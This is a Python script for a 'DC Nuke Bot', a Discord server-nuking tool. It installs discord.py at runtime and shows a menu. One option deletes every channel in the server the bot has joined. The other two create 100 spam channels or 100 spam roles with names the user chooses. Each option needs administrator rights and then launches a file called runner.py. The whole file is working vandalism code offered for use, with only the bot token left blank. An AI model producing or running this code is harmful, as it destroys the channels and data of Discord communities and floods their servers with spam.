import pip

a = "discord"
def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])


if __name__ == '__main__':
   
    install(a)

import discord
from discord.ext import commands

TOKEN = ''



import os
os.system("cls")




menu = '''

██████╗░░█████╗░  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
██╔══██╗██╔══██╗  ████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██║░░██║██║░░╚═╝  ██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║░░██║██║░░██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░
██████╔╝╚█████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═════╝░░╚════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░

[1]: Delete channels
[2]: Channel maker
[3]: Role maker

'''
print(menu)

aa = input("[]: ")

#channel maker
if aa == "1":
    intents = discord.Intents.default()
    intents.members = True
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]  
        if guild.me.guild_permissions.administrator:
            for channel in guild.channels:
                await channel.delete()
            print("All channels have been nuked! 💥")
            os.startfile("runner.py")
            exit()
        else:
            print("The bot does not have administrator permissions to nuke the server.")
    bot.run(TOKEN)




if aa == "2":
    cname = input("Name of the channels: ")
    intents = discord.Intents.default()
    intents.guilds = True 
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0]  
        if guild.me.guild_permissions.administrator:  
            for i in range(100):
                await guild.create_text_channel(cname)
            print("100 channels have been created! 🎉")
            os.startfile("runner.py")
            exit()
        else:
            print("The bot does not have administrator permissions to create channels.")
    bot.run(TOKEN)



if aa == "3":
    rname = input("Spam roles name: ")
    intents = discord.Intents.default()
    intents.guilds = True  
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'{bot.user.name} has connected to Discord!')
        guild = bot.guilds[0] 
        if guild.me.guild_permissions.administrator:
            for i in range(100): 
                await guild.create_role(name=rname, color=discord.Color.default())
            print("A new role has been created! 🎉")
            os.startfile("runner.py")
            exit()
        else:
            print("The bot does not have administrator permissions to create roles.")
    bot.run(TOKEN)
